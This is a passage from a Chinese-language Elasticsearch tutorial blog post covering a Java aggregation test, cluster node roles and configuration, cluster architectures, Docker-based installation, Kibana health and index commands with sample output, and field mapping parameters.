的平均值  </span><br><span class="line">     \*/  </span><br><span class="line">    @Test  </span><br><span class="line">    void aggs11() &#123;  </span><br><span class="line">        TermsAggregationBuilder createMonthGroup = AggregationBuilders.terms(&quot;createMonthGroup&quot;).field(&quot;createMonth&quot;)  </span><br><span class="line">                .subAggregation(AggregationBuilders.terms(&quot;sexGroup&quot;).field(&quot;sex&quot;)  </span><br><span class="line">                        .subAggregation(AggregationBuilders.avg(&quot;buyCountAvg&quot;).field(&quot;buyCount&quot;)));  </span><br><span class="line">  </span><br><span class="line">        Query query = new NativeSearchQueryBuilder()  </span><br><span class="line">                .withAggregations(createMonthGroup)  </span><br><span class="line">//                .addAggregation(createMonthGroup)  </span><br><span class="line">                .build();  </span><br><span class="line">        SearchHits&lt;JhTestEntity&gt; search = elasticsearchRestTemplate.search(query, JhTestEntity.class);  </span><br><span class="line">        if (search.hasAggregations()) &#123;  </span><br><span class="line">            Aggregations aggregations = (Aggregations) search.getAggregations().aggregations();  </span><br><span class="line">            if (Objects.nonNull(aggregations)) &#123;  </span><br><span class="line">                Terms terms = aggregations.get(&quot;createMonthGroup&quot;);  </span><br><span class="line">                terms.getBuckets().forEach(bucket -&gt; &#123;  </span><br><span class="line">                    String createMonth = bucket.getKeyAsString();  </span><br><span class="line">                    Aggregations sexAggs = bucket.getAggregations();  </span><br><span class="line">                    if (Objects.nonNull(sexAggs)) &#123;  </span><br><span class="line">                        Terms sexTerms = sexAggs.get(&quot;sexGroup&quot;);  </span><br><span class="line">                        sexTerms.getBuckets().forEach(sexBucket -&gt; &#123;  </span><br><span class="line">                            String sex = sexBucket.getKeyAsString();  </span><br><span class="line">                            Aggregations avgAggs = sexBucket.getAggregations();  </span><br><span class="line">                            if (Objects.nonNull(avgAggs)) &#123;  </span><br><span class="line">                                Avg avg = avgAggs.get(&quot;buyCountAvg&quot;);  </span><br><span class="line">                                log.info(&quot;计算 &#123;&#125; 月，&#123;&#125; 性 的平均值为：&#123;&#125; &quot;, createMonth, sex, avg.getValue());  </span><br><span class="line">                            &#125;  </span><br><span class="line">                        &#125;);  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;);  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-3-ES-ES工业级Java-应用开发"><a href="#5-3-ES-ES工业级Java-应用开发" class="headerlink" title="5.3 ES ES工业级Java 应用开发"></a>5.3 ES ES工业级Java 应用开发</h2><p>一般不会直接使用RestHighLevelClient对于ES操作，因为语法过于繁琐，重复，基于分离变和不变的原则可以进行工业级封装。</p><p><a href="http://localhost:8080/doc.html">http://localhost:8080/doc.html</a></p><p><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/22.png"><br>工业级封装后的Service：</p><blockquote><p>文章实在太长， 这里省略了500字+， 省略的内容请参见的免费电子书 PDF版本《ES学习圣经：从0到1, 精通 ElasticSearch 工业级使用 》</p></blockquote><h1 id="6-ES集群架构"><a href="#6-ES集群架构" class="headerlink" title="6 ES集群架构"></a>6 ES集群架构</h1><h2 id="6-1-ES集群的5大角色"><a href="#6-1-ES集群的5大角色" class="headerlink" title="6.1 ES集群的5大角色"></a>6.1 ES集群的5大角色</h2><ol><li><strong>Master Node ：主节点</strong></li></ol><p>主节点，该节点不和应用创建连接，每个节点都保存了集群状态。master节点控制整个集群的元数据。只有Master Node节点可以修改节点状态信息，及元数据(metadata)的处理。 元数据(metadata)，比如：</p><ul><li><p>索引的分片信息 、主副本信息</p></li><li><p>分片的节点分配信息，路由分配</p></li><li><p>index 、type、Mapping</p></li><li><p>Setting 配置等等。</p></li></ul><p>从资源占用的角度来说：master节点不占用磁盘IO和CPU，内存使用量一般， 没有data 节点高类似于kafa中的 controller，负责集群元数据的管理和维护</p><ol start="2"><li><p><strong>Master eligible nodes ：合格节点</strong> 有资格成为Master节点但暂时并不是Master的节点被称为 eligible 节点，该节点可以参加选主流程，成为Master节点. 该节点只是与集群保持心跳，判断Master是否存活，如果Master故障则参加新一轮的Master选举。 从资源占用的角度来说：eligible节点比Master节点更节省资源，因为它还未成为 Master 节点， 只是有资格成功Master节点。</p></li><li><p><strong>Data Node ：数据节点</strong> 职责： 数据节点，用于建立文档索引，管理shard。 类似于rocket 中的 broker，负责数据的管理和维护，数据节点职责：</p></li></ol><ul><li><p>该节点用于建立文档索引， 接收 应用创建连接、接收索引请求</p></li><li><p>查询，接收用户的搜索请求</p></li></ul><p>data节点的分片执行查询语句获得查询结果后将结果反馈给Coordinating节点，在查询的过程中非常消 耗硬件资源，如果在分片配置及优化没做好的情况下，进行一次查询非常缓慢(硬件配置也要跟上数据量)。 数据节点：保存包含索引文档的分片数据，执行CRUD、搜索、聚合相关的操作。属于：内存、CPU、IO密集型，对硬件资源要求高。 从资源占用的角度来说：data节点会占用大量的CPU、IO和内存</p><ol start="4"><li><strong>Coordinating Node ：协调节点(&#x2F;路由节点&#x2F;client节点)</strong></li></ol><p>协调节点，该节点专用与接收应用的查询连接、接受搜索请求，但其本身不负责存储数据 协调节点，接受客户端搜索请求后将请求转发到与查询条件相关的多个data节点的分片上，然后多个data节点的分片执行查询语句或者查询结果再返回给协调节点，协调节点把各个data节点的返回结果进行整合、排序等一系列操作后再将最终结果返回给用户请求。 data节点的分片执行查询语句获得查询结果后将结果反馈给Coordinating节点，在查询的过程中非常消耗硬件资源，如果在分片配置及优化没做好的情况下，进行一次查询非常缓慢(硬件配置也要跟上数据量)。 搜索请求在两个阶段中执行（query 和 fetch），这两个阶段由接收客户端请求的节点 - 协调节点协调。</p><ul><li><p>在请求query 阶段，协调节点将请求转发到保存数据的数据节点。每个数据节点在本地执行请求并将其结果返回给协调节点。</p></li><li><p>在收集fetch阶段，协调节点将每个数据节点的结果汇集为单个全局结果集。</p></li></ul><p>从资源占用的角度来说：协调节点，可当负责均衡节点，该节点不占用io、cpu和内存 总结：Coordinating 大致的职责 ： 请求分发、结果的合并</p><ol start="5"><li><strong>Ingest Node ：ingest节点</strong></li></ol><p>ingest 节点可以看作是数据前置处理转换的节点，支持 pipeline管道 设置，可以使用 ingest 对数据进 行过滤、转换等操作，类似于 logstash 中 filter 的作用，功能相当强大。 Ingest节点处理时机——在数据被索引之前，通过预定义好的处理管道对数据进行预处理。默认情况下，所有节点都启用Ingest，因此任何节点都可以处理Ingest任务。 当然，我们也可以创建专用的Ingest节点。</p><ol start="6"><li><strong>部落（tribe）</strong></li></ol><p>接着说一下ES里面的部落：tribe， 可以在查询过程中链接两个集群的数据，查询的数据将会汇总到tribe节点，有tribe节点对数据进行整合再发送给client； tribe还可以写数据，但是这里有一个限制，就是写的索引只能是一个集群所有；如果写入两个集群同名索引，那么只能成功写入一个，至于写入哪一个可以通过配置偏好实现。 可以通过配置指明tribe只能读，不能写。</p><h2 id="6-2-ES集群节点角色配置"><a href="#6-2-ES集群节点角色配置" class="headerlink" title="6.2 ES集群节点角色配置"></a>6.2 ES集群节点角色配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">1. node.master  </span><br><span class="line">2. node.data  </span><br><span class="line">3. node.ingest  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>配置实例&#x2F;usr&#x2F;share&#x2F;elasticsearch&#x2F;config&#x2F;elasticsearch.yml</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">bootstrap.memory\_lock: true  </span><br><span class="line">cluster.name: &quot;es-cluster&quot;  </span><br><span class="line">node.name: master1  </span><br><span class="line">node.master: true  </span><br><span class="line">node.data: true  </span><br><span class="line">network.host: 0.0.0.0  </span><br><span class="line">http.port: 9200  </span><br><span class="line">transport.tcp.port: 9300  </span><br><span class="line">cluster.initial\_master\_nodes: \[&quot;master1&quot;\]  </span><br><span class="line">discovery.zen.ping.unicast.hosts: master1, master2, master3  </span><br><span class="line">#官方推荐 master-eligible nodes / 2 + 1 向下取整的个数  </span><br><span class="line">discovery.zen.minimum\_master\_nodes: 2  </span><br><span class="line">path.logs: /usr/share/elasticsearch/logs  </span><br><span class="line">http.cors.enabled: true  </span><br><span class="line">http.cors.allow-origin: &quot;\*&quot;  </span><br><span class="line">xpack.security.audit.enabled: true  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>默认情况下这三个属性的值都是true，实际上，一个节点在默认情况下会同时扮演：Master Node，Data Node 和 Ingest Node。</p><table><thead><tr><th><strong>节点类型</strong></th><th><strong>配置参数</strong></th><th><strong>默认值</strong></th></tr></thead><tbody><tr><td>Master Eligible</td><td>node.master</td><td>true</td></tr><tr><td>Data</td><td>node.data</td><td>true</td></tr><tr><td>Coordinating only</td><td>无</td><td></td></tr></tbody></table><p>设置上面2 个参数全为 false，节点为专用协调节点</p><p>|| Ingest| node.ingest| true|</p><h2 id="6-3-ES节点配置组合"><a href="#6-3-ES节点配置组合" class="headerlink" title="6.3 ES节点配置组合"></a>6.3 ES节点配置组合</h2><ol><li><strong>组合1</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">node.master: true   </span><br><span class="line">node.data: true   </span><br><span class="line">node.ingest: true  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">这种组合表示这个节点既有成为主节点的资格，又可以存储数据，还可以作为预处理节点这个时候如果某个节点被选举成为了真正的主节点，那么他还要存储数据，这样对于这个节点的压力就比较大了。  </span><br><span class="line">elasticsearch 默认是：每个节点都是这样的配置，在测试环境下这样做没问题。实际工作中建议不要这  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>样设置，这样相当于 主节点 和 数据节点 的角色混合到一块了。</p><ol start="2"><li><strong>组合2</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">node.master: false   </span><br><span class="line">node.data: true   </span><br><span class="line">node.ingest: false  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这种组合表示这个节点没有成为主节点的资格，也就不参与选举，只会存储数据。这个节点我们称为 data(数据)节点。在集群中需要单独设置几个这样的节点负责存储数据。后期提供存储和查询服务</p><ol start="3"><li><strong>组合3</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">node.master: true  </span><br><span class="line">node.data: false  </span><br><span class="line">node.ingest: false  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这种组合表示这个节点不会存储数据，有成为主节点的资格，可以参与选举，有可能成为真正的主节点。这个节点我们称为master节点</p><ol start="4"><li><strong>组合4</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">node.master: false   </span><br><span class="line">node.data: false   </span><br><span class="line">node.ingest: true  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这种组合表示这个节点即不会成为主节点，也不会存储数据，这个节点的意义是作为一个 client(客户端)节点，主要是针对海量请求的时候可以进行负载均衡。 在新版 ElasticSearch5.x 之后该节点称之为：coordinate 节点，其中还增加了一个叫：ingest 节点，用 于预处理数据（索引和搜索阶段都可以用到）。 当然，作为一般应用是不需要这个预处理节点做什么额外的预处理过程，那么这个节点和我们称之为client 节点之间可以看做是等同的，我们在代码中配置访问节点就都可以配置这些 ingest 节点即可。‍</p><h2 id="6-4-高可用ES的部署架构"><a href="#6-4-高可用ES的部署架构" class="headerlink" title="6.4 高可用ES的部署架构"></a>6.4 高可用ES的部署架构</h2><p><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/23.png"></p><ol><li><strong>小型的ES集群（&lt;10）的节点架构</strong></li></ol><p><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/24.png"></p><ul><li><p>对于Ingest转换节点，如果我们没有格式转换、类型转换等需求，直接设置为false。</p></li><li><p>3-5个节点属于轻量级集群，要保证主节点个数满足((节点数&#x2F;2)+1)。</p></li><li><p>轻量级集群，节点的多重属性如：Master&amp;Data设置为同一个节点可以理解的。</p></li><li><p>如果进一步优化，5节点可以将Master和Data再分离。</p></li></ul><ol start="2"><li><strong>中型的ES集群（10-50）的节点架构</strong></li></ol><ul><li><p>三台服务器做master节点 （可选）</p></li><li><p>N（比如20）台服务器作为data节点（存储资源要大）</p></li><li><p>N（比如5）台做coodinate&#x2F;ingest节点（用于搜索结果合并，可以提高ES查询效率）</p></li></ul><p><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/25.png"><br>3.  <strong>超大型的ES集群的节点架构（150个节点+）</strong></p><p>可以按照100个节点为单位，分成多个集群，通过 tribenode连接，单个ES数据库最好的高可用集群部署架构为：每个集群，三台服务器做master节点</p><ul><li><p>N（比如50）台服务器作为data节点（存储资源要大）</p></li><li><p>N（比如5）台做coodinate节点（用于搜索结果合并，可以提高ES查询效率）</p></li><li><p>N（比如2）台做ingest节点（用于数据转换，可以提高ES索引效率）</p></li></ul><h2 id="6-5-小型ES集群的安装"><a href="#6-5-小型ES集群的安装" class="headerlink" title="6.5 小型ES集群的安装"></a><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/26.png"><br>6.5 小型ES集群的安装</h2><h3 id="6-5-1-Image镜像"><a href="#6-5-1-Image镜像" class="headerlink" title="6.5.1 Image镜像"></a>6.5.1 Image镜像</h3><p>有外网环境，拉取镜像代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#下载elasticsearch,带中文分词器的版本  </span><br><span class="line">docker pull andylsr/elasticsearch-with-ik-icu:7.14.0  </span><br><span class="line">#下载kibana  </span><br><span class="line">docker pull docker.elastic.co/kibana/kibana:7.14.0  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>无外网环境，可以先从有公网的环境拉取镜像，然后导出镜像</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">docker save andylsr/elasticsearch-with-ik-icu:7.14.0 -o /root/elasticsearchwith-ik-icu.tar  </span><br><span class="line">docker save docker.elastic.co/kibana/kibana:7.14.0 -o /root/kibana.tar  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后上传导出的de镜像到dao目标虚拟机，然后导入镜像到docker</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">docker load -i /vagrant/3G-middleware/elasticsearch-with-ik-icu.tar  </span><br><span class="line">docker load -i /vagrant/3G-middleware/kibana.tar  </span><br><span class="line">docker load -i /vagrant/3G-middleware/haproxy.tar  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="6-5-2-创建目录结构"><a href="#6-5-2-创建目录结构" class="headerlink" title="6.5.2 创建目录结构"></a>6.5.2 创建目录结构</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">mkdir -p /home/docker-compose/elasticsearch7/&#123;coordinate1,coordinate2&#125;-&#123;logs,data&#125;  </span><br><span class="line">mkdir -p /home/docker-compose/elasticsearch7/&#123;master1,master2,master3&#125;-&#123;logs,data&#125;  </span><br><span class="line">chmod -R 777 /home/docker-compose/elasticsearch7  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="6-5-3-安装ES集群"><a href="#6-5-3-安装ES集群" class="headerlink" title="6.5.3 安装ES集群"></a>6.5.3 安装ES集群</h3><p>把docker-compose和ES相应配置文件拷贝到<code>/home/docker-compose</code>目录下，执行如下命令安装ES集群</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">docker-compose --compatibility up -d # 兼容模式后台启动  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>--compatibility：表示已兼容模式启动容器</p></li><li><p>-d：表示后台启动</p></li></ul><h2 id="6-6-使用kibana访问集群"><a href="#6-6-使用kibana访问集群" class="headerlink" title="6.6 使用kibana访问集群"></a>6.6 使用kibana访问集群</h2><ol><li><strong>查看集群健康情况</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">GET \_cat/health?v  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">epoch      timestamp cluster    status node.total node.data shards pri relo init unassign pending\_tasks max\_task\_wait\_time active\_shards\_percent  </span><br><span class="line">1670418184 13:03:04  es-cluster green           5         3     16   8    0    0        0             0                  -                100.0%  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>status选项的值</p><ul><li><p>green : 所有primary shard和replica shard都已成功分配, 集群是100%可用的</p></li><li><p>yellow : 所有primary shard都已成功分配, 但至少有一个replica shard缺失. 此时集群所有功能都正常使用, 数据不会丢失, 搜索结果依然完整, 但集群的可用性减弱. —— 需要及时处理的警告</p></li><li><p>red : 至少有一个primary shard(以及它的全部副本分片)缺失 —— 部分数据不能使用, 搜索只能返回部分数据, 而分配到这个分配上的写入请求会返回一个异常. 此时虽然可以运行部分功能, 但为了索引数据的完整性, 需要尽快修复集群</p></li></ul><ol start="2"><li><strong>查看集群中的节点个数</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">GET \_cat/nodes?v  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">ip         heap.percent ram.percent cpu load\_1m load\_5m load\_15m node.role   master name  </span><br><span class="line">172.19.0.2           36          95  12    0.20    0.43     0.73 cdfhilmrstw -      master2  </span><br><span class="line">172.19.0.7           75          95  12    0.20    0.43     0.73 cdfhilmrstw \*      master3  </span><br><span class="line">172.19.0.5           29          95  12    0.20    0.43     0.73 cdfhilmrstw -      master1  </span><br><span class="line">172.19.0.6           64          96  12    0.20    0.43     0.73 lr          -      coordinate2  </span><br><span class="line">172.19.0.3           23          96  12    0.20    0.43     0.73 lr          -      coordinate1  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>第一列（ip）：es节点ip</p></li><li><p>第二列（heap.percent）：堆内存占比</p></li><li><p>第三列（ram.percent）：内存使用占比</p></li><li><p>第四列（cpu）：cpu使用率</p></li><li><p>第五列（load_1m）：1分钟内平均load情况</p></li><li><p>第六列（load_5m）：5分钟内平均load情况</p></li><li><p>第七列（load_15m）：15分钟内平均load情况</p></li><li><p>第八列（node.role）：节点权限</p></li><li><p>第九列（master）：是否master节点，*为master节点</p></li><li><p>第十列（name）：节点名称</p></li></ul><p><strong>（1）heap.percent</strong> 表示ES使用的JVM内存情况，该值应该低于75，如果长时间大于75，表示JVM内存配置不够，如果JVM已经配置到30G，则表示该Datanode节点上的压力较大，需要考虑增加Datanode节点来分摊压力 <strong>（2）ram.percent</strong> 表示机器上内存的使用情况，实际对应linux上的 used+cache内存使用情况，如果该值接近100%，则表示机器上cache内存不够用，主要是由于ES检索中，lucene会消耗大量cache内存，如果cache不够，会导致lucene无法将部分文件加载到cache中，会频繁从磁盘中进行读取，导致查询延时加大</p><ol start="3"><li><strong>查看集群中的索引</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">GET \_cat/indices?v  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">health status index                           uuid                   pri rep docs.count docs.deleted store.size pri.store.size  </span><br><span class="line">green  open   .kibana-event-log-7.14.0\-000001 1uw627v6T8KPBv2xrlPlPQ   1   1          9            0     97.8kb         48.9kb  </span><br><span class="line">green  open   .kibana\_7.14.0\_001              1G2WGiXOT2Wvux7R\_5TuLA   1   1         86           14      4.9mb          2.7mb  </span><br><span class="line">green  open   .apm-custom-link                dMukcWA2QVOFzsOhWiPOng   1   1          0            0       416b           208b  </span><br><span class="line">green  open   .apm-agent-configuration        ReYFH-LaQbmWjGTwif0nHA   1   1          0            0       416b           208b  </span><br><span class="line">green  open   .kibana\_task\_manager\_7.14.0\_001 H-3hQBgZRO2AfYsWLS6LQw   1   1         14         1275    622.9kb        337.1kb  </span><br><span class="line">green  open   user                            HdrFzj7TQ\_ejXe\_9Xdx1LQ   1   1          6            2     37.4kb         17.4kb  </span><br><span class="line">green  open   .tasks                          DudUNrFYTq24R7ZY9IFK5A   1   1         16            0     80.9kb         43.4kb  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="7-数据类型和映射"><a href="#7-数据类型和映射" class="headerlink" title="7 数据类型和映射"></a>7 数据类型和映射</h1><h2 id="7-1-映射的创建"><a href="#7-1-映射的创建" class="headerlink" title="7.1 映射的创建"></a>7.1 映射的创建</h2><p>和传统数据库不同，传统的数据库我们尝试向表中插入数据的前提是这个表已经存在数据结构的定义，且插入数据的字段要在表结构中被定义。 而ES的映射的创建支持主动和被动创建。</p><ol><li><strong>被动创建（动态映射）</strong></li></ol><p>此时字段和映射类型不需要事先定义，只需要存在文档的索引，当向此索引添加数据的时候当遇到不存在的映射字段，ES会根据数据内容自动添加映射字段定义。</p><ol start="2"><li><strong>主动创建（显示映射）</strong></li></ol><p>动态映射只能保证最基础的数据结构的映射，所以很多时候我们需要对字段除了数据结构定义更多的限制的时候，动态映射创建的内容很可能不符合我们的需求，所以可以使用 PUT {index}&#x2F;mapping 来更新指定索引的映射内容。</p><h2 id="7-2-动态映射Dynamic-Mapping"><a href="#7-2-动态映射Dynamic-Mapping" class="headerlink" title="7.2 动态映射Dynamic Mapping"></a>7.2 动态映射Dynamic Mapping</h2><p>写入文档的时候，索引不存在，会自动创建索引， 无需手动创建，ES会根据内容推断字段的类型，推断会不准确，可能造成某些功能无法使用，例如 范围查询。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">POST /log2/\_doc/1  </span><br><span class="line">&#123;  </span><br><span class="line">    &quot;uid&quot; : 1,  </span><br><span class="line">    &quot;ip&quot; : &quot;192.1.1.1&quot;,  </span><br><span class="line">    &quot;transTime&quot; : &quot;2018-01-01&quot;,  </span><br><span class="line">    &quot;content&quot; : &quot;中华人民共和国人民大会堂&quot;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">查看一个索引当前的mapping  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">GET /log2/\_mapping  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>结果如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line">    &quot;log2&quot;: &#123;  </span><br><span class="line">        &quot;mappings&quot;: &#123;  </span><br><span class="line">            &quot;properties&quot;: &#123;  </span><br><span class="line">                &quot;content&quot;: &#123;  </span><br><span class="line">                    &quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">                    &quot;fields&quot;: &#123;  </span><br><span class="line">                        &quot;keyword&quot;: &#123;  </span><br><span class="line">                            &quot;type&quot;: &quot;keyword&quot;,  </span><br><span class="line">                            &quot;ignore\_above&quot;: 256  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;,  </span><br><span class="line">                &quot;ip&quot;: &#123;  </span><br><span class="line">                    &quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">                    &quot;fields&quot;: &#123;  </span><br><span class="line">                        &quot;keyword&quot;: &#123;  </span><br><span class="line">                            &quot;type&quot;: &quot;keyword&quot;,  </span><br><span class="line">                            &quot;ignore\_above&quot;: 256  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;,  </span><br><span class="line">                &quot;transTime&quot;: &#123;  </span><br><span class="line">                    &quot;type&quot;: &quot;date&quot;  </span><br><span class="line">                &#125;,  </span><br><span class="line">                &quot;uid&quot;: &#123;  </span><br><span class="line">                    &quot;type&quot;: &quot;long&quot;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">动态映射规则</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><table><thead><tr><th><strong>JSON中数据类型</strong></th><th><strong>Elasticsearch 数据类型</strong></th></tr></thead><tbody><tr><td>null</td><td>不添加任何字段</td></tr><tr><td>true或者false</td><td>boolean类型</td></tr><tr><td>浮点数据</td><td>float类型</td></tr><tr><td>integer数据</td><td>long类型</td></tr><tr><td>object</td><td>object类型</td></tr><tr><td>array</td><td>取决于数组中的第一个非空值的类型。</td></tr><tr><td>string</td><td>匹配日期格式，设置为date；匹配数字，设置为float或者long，功能默认关闭；设置为text，并增加keyword子字段。</td></tr></tbody></table><h2 id="7-3-显示的设置mapping"><a href="#7-3-显示的设置mapping" class="headerlink" title="7.3 显示的设置mapping"></a>7.3 显示的设置mapping</h2><p>显示的设置mapping可以更灵活控制ES。 映射创建时，除了对字段的定义，Mapping创建的时候提供了一些对于查询策略和自身定义的参数配置。 下面只是简单介绍下映射支持的字段参数内容。</p><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>analyzer</td><td>定义此字段索引时使用的分词方式</td></tr><tr><td>normalizer</td><td>normalizer功能类似于analyzer，但是其可以使查询条件输出唯一的查询条件（可以认为其只是实现了条件小写等不会产生多个查询条件的相关操作）</td></tr><tr><td>boost</td><td>定义当前字段的查询权重</td></tr><tr><td>coerce</td><td>此字段控制是否尝试修复部分错误的数据格式，（比如对一个整数字段插入字符串比如”5”，此时此字符串可以被解析为数字），默认为true</td></tr><tr><td>copy_to</td><td>类似于别名，不同之处参数可以将此字段内容复制到指定字段中，多个字段可以复制到同一个字段中</td></tr><tr><td>doc_values</td><td>倒排索引虽然可以快速查询文档中内容，但是在进行排序或聚合操作的时候，倒排索引并不能获得文档内容，所以需要存储一份文档数据到doc_values，而此参数控制字段是否需要存储在doc_values中的开关。</td></tr><tr><td>dynamic</td><td>是否开启动态映射，目前支持三个参数：true&#x2F;false 开启和关闭，strict 当出现未定义的字段，抛出异常并拒绝添加文档</td></tr><tr><td>enabled</td><td>此参数控制字段是否可以被索引，当被设置为false的时候表示此字段仅用来存储而无需索引，此时ES不会分析此字段内的数据，所以即使插入的非法的数据内容ES依旧允许执行</td></tr><tr><td>fielddata</td><td>类似doc_values都是单独存储额外的文档数据，这样通过倒排索引获取文档内容，从而实现在排序和聚合上的功能。不同的是doc_values不支持text格式，text格式数据需要使用fielddata。此参数默认是禁止的，这是因为在第一次对字段进行排序或聚合的时候它会把这个列数据都加载到内存中，这样会带来大量的内存消耗。</td></tr><tr><td>eager_global_ordinals</td><td>是否使用全局序号来进行聚合。主要在聚合分析构建hash的时候，使用序号来替代doc的值，这样在文档收集阶段根据需要收集到各个桶中，在计算结果时将序号转换为具体doc内容。但是此操作在每次查询时需要重建doc序号关系</td></tr><tr><td>format</td><td>日期类型字段用来解析的日期格式</td></tr><tr><td>ignore_above</td><td>当插入字段长度超过此字段设置的值后，此内容将不被索引或存储。对于数组结构字段会作用到每一个元素</td></tr><tr><td>ignore_malformed</td><td>当向一个字段插入错误的数据类似时，会抛出异常并拒绝文档。但设置此参数后，对字段插入错误的数据时会忽略异常，此文档错误的数据将不被索引，但是其他字段则正常。</td></tr><tr><td>index_options</td><td>控制将哪些信息添加到反向索引中</td></tr><tr><td>index_phrases</td><td>主要将两个单词的组合索引到单独字段中，这样在进行精确的短语查询的时候会更有效。支持true和false参数。默认为false。此参数会使索引变大</td></tr><tr><td>index_prefixes</td><td>允许对字段的前缀进行索引，此参数用来提高查询的速度</td></tr><tr><td>index</td><td>控制字段是否可以被索引，被设置为false的字段无法被索引到</td></tr><tr><td>fields</td><td>此参数可以为同一个字段设置不同的索引方式，但是在_source字段中只会保存一份，并不会实际增加存储